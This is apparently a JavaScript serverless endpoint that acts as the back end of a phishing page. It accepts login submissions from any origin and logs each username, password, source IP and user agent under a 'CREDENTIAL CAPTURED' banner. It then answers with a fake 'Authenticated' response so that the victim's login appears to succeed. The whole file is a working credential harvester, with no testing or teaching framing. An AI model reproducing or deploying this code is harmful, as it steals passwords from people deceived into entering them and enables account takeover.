export default async function handler(req, res) {
    // Set CORS headers for flexibility
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        let body = {};

        try {
            // Handle different body parsing scenarios
            if (typeof req.body === 'object' && req.body !== null) {
                body = req.body;
            } else if (typeof req.body === 'string') {
                body = JSON.parse(req.body);
            } else {
                // Fallback for streaming
                const buffers = [];
                for await (const chunk of req) {
                    buffers.push(chunk);
                }
                const rawString = Buffer.concat(buffers).toString();
                body = JSON.parse(rawString);
            }
        } catch (e) {
            console.error('Body parsing error:', e);
            body = {};
        }

        const username = body.user || body.username || 'Not Provided';
        const password = body.pass || body.password || 'Not Provided';
        const timestamp = new Date().toISOString();

        // Professional logging
        console.log(`\n🔐 === CREDENTIAL CAPTURED === 🔐`);
        console.log(`Timestamp : ${timestamp}`);
        console.log(`Username  : ${username}`);
        console.log(`Password  : ${password}`);
        console.log(`IP Source : ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown'}`);
        console.log(`User-Agent: ${req.headers['user-agent'] || 'Unknown'}`);
        console.log(`====================================\n`);

        // Return success to mimic real login flow
        return res.status(200).json({ 
            status: 'success',
            message: 'Authenticated'
        });
    }

    return res.status(405).json({ message: 'Method Not Allowed' });
}